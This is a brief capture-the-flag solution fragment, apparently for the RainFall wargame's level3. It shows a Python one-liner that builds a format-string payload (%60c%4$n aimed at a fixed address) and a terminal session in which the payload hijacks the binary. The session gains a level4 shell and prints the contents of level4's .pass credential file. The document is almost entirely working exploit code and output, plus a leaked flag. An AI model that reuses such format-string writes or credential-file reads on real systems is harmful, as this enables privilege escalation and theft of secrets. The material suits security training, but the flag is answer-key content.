```
    python -c 'print("\x8c\x98\x04\x08" + "%60c%4$n")' > /tmp/hh
```

```
    level3@RainFall:~$ (cat /tmp/hh; cat) | ./level3
    �                                                           
    Wait what?!
    whoami
    level4
    cat /home/user/level4/.pass
    b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```